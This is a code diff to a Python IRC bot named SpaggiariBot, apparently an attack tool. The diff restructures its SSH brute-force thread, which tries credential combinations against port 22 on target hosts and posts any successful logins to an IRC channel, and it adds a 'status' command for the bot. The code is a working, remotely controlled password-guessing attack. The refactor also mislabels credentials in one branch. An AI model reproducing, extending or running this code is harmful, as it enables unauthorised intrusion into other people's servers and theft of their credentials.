@@ -246,57 +246,38 @@ class ssh_bruteforce(threading.Thread):
                 if SpaggiariBot.stop_scan:
                     break
                 passwd = combos[item]
-                if type(passwd) == list:
-                    for item in passwd:
-                        try:
+                try:
+                    if type(passwd) == list:
+                        for item in passwd:
                             ssh.connect(hostname=self.host, port=22, username=user, password=item, timeout=10.0, allow_agent=False, look_for_keys=False, banner_timeout=10.0)
                             alert('Successful connection to %s using %s:%s' % (self.host, user, item))
                             SpaggiariBot.sendmsg(channel, '[%s] - Successful connection to %s using %s:%s' % (color('+', green), self.host, user, item))
                             SpaggiariBot.stop_scan = True
                             break
-                        except paramiko.ssh_exception.AuthenticationException:
-                            error('Failed to connect to %s using %s:%s (Authentication Error)' % (self.host, user, item))
-                            SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s'  % (self.host, user, item), 'Authentication Error')
-                        except paramiko.ssh_exception.BadHostKeyException:
-                            error('Failed to connect to %s using %s:%s (Bad Host Key Exception)' % (self.host, user, item))
-                            SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s'    % (self.host, user, item), 'Bad Host Key Exception')
-                        except paramiko.ssh_exception.SSHException:
-                            error('Failed to connect to %s using %s:%s (SSH Exception)'       % (self.host, user, item))
-                            SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (self.host, user, item), 'SSH Exception')
-                        except socket.error as ex:
-                            error('Failed to connect to %s using %s:%s (%s)'                  % (self.host, user, item, ex))
-                            SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (self.host, user, item), ex)
-                        except Exception as ex:
-                            error('Failed to connect to %s using %s:%s (%s)'                  % (self.host, user, item, ex))
-                            SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (self.host, user, item), ex)
-                        finally:
-                            ssh.close()
-                            time.sleep(throttle)
-                else:
-                    try:
+                    else:
                         ssh.connect(hostname=self.host, port=22, username=user, password=passwd, timeout=10.0, allow_agent=False, look_for_keys=False, banner_timeout=10.0)
-                        alert('Successful connection to %s using %s:%s' % (self.host, user, passwd))
-                        SpaggiariBot.sendmsg(channel, '[%s] - Successful connection to %s using %s:%s' % (color('+', green), self.host, user, passwd))
+                        alert('Successful connection to %s using %s:%s' % (self.host, user, item))
+                        SpaggiariBot.sendmsg(channel, '[%s] - Successful connection to %s using %s:%s' % (color('+', green), self.host, user, item))
                         SpaggiariBot.stop_scan = True
                         break
-                    except paramiko.ssh_exception.AuthenticationException:
-                        error('Failed to connect to %s using %s:%s (Authentication Error)' % (self.host, user, passwd))
-                        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s'  % (self.host, user, passwd), 'Authentication Error')
-                    except paramiko.ssh_exception.BadHostKeyException:
-                        error('Failed to connect to %s using %s:%s (Bad Host Key Exception)' % (self.host, user, passwd))
-                        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s'    % (self.host, user, passwd), 'Bad Host Key Exception')
-                    except paramiko.ssh_exception.SSHException:
-                        error('Failed to connect to %s using %s:%s (SSH Exception)'       % (self.host, user, passwd))
-                        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (self.host, user, passwd), 'SSH Exception')
-                    except socket.error as ex:
-                        error('Failed to connect to %s using %s:%s (%s)'                  % (self.host, user, passwd, ex))
-                        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (self.host, user, passwd), ex)
-                    except Exception as ex:
-                        error('Failed to connect to %s using %s:%s (%s)'                  % (self.host, user, passwd, ex))
-                        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (self.host, user, passwd), ex)
-                    finally:
-                        ssh.close()
-                        time.sleep(throttle)            
+                except paramiko.ssh_exception.AuthenticationException:
+                    error('Failed to connect to %s using %s:%s (Authentication Error)' % (self.host, user, item))
+                    SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s'  % (self.host, user, item), 'Authentication Error')
+                except paramiko.ssh_exception.BadHostKeyException:
+                    error('Failed to connect to %s using %s:%s (Bad Host Key Exception)' % (self.host, user, item))
+                    SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s'    % (self.host, user, item), 'Bad Host Key Exception')
+                except paramiko.ssh_exception.SSHException:
+                    error('Failed to connect to %s using %s:%s (SSH Exception)'       % (self.host, user, item))
+                    SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (self.host, user, item), 'SSH Exception')
+                except socket.error as ex:
+                    error('Failed to connect to %s using %s:%s (%s)'                  % (self.host, user, item, ex))
+                    SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (self.host, user, item), ex)
+                except Exception as ex:
+                    error('Failed to connect to %s using %s:%s (%s)'                  % (self.host, user, item, ex))
+                    SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (self.host, user, item), ex)
+                finally:
+                    ssh.close()
+                    time.sleep(throttle)
         else:
             error('%s does not have port 22 open.' % self.host)
             SpaggiariBot.error(channel, '%s does not have port 22 open.' % self.host)
@@ -399,6 +380,11 @@ class IRC(object):
                         self.scanning = False
                         self.quit('KILLED')
                         sys.exit()
+                    elif cmd == 'status':
+                        if self.scanning:
+                            self.sendmsg(chan, 'Scanning: ' + color('True', green))
+                        else:
+                            self.sendmsg(chan, 'Scanning: ' + color('False', red))
                     elif cmd == 'stop':
                         if self.scanning:
                             self.stop_scan = True
